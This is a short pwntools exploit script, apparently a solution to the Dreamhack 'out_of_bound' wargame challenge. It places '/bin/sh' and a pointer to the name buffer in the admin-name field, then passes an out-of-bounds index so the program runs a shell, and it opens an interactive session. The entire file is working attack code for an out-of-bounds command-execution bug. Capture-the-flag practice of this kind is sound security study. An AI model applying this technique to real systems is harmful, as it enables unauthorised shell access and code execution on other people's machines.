from pwn import *

p = process('./out_of_bound')
#p = remote('host3.dreamhack.games', 19569)
#gdb.attach(p, api=True)
add_name = 0x804a0ac # p&name
add_cmd = 0x804a060
name = b"/bin/sh\x00"
idx = b'21'
p.sendlineafter(b'Admin name: ', name + p32(add_name))
p.sendlineafter(b'want?: ', idx)
p.interactive()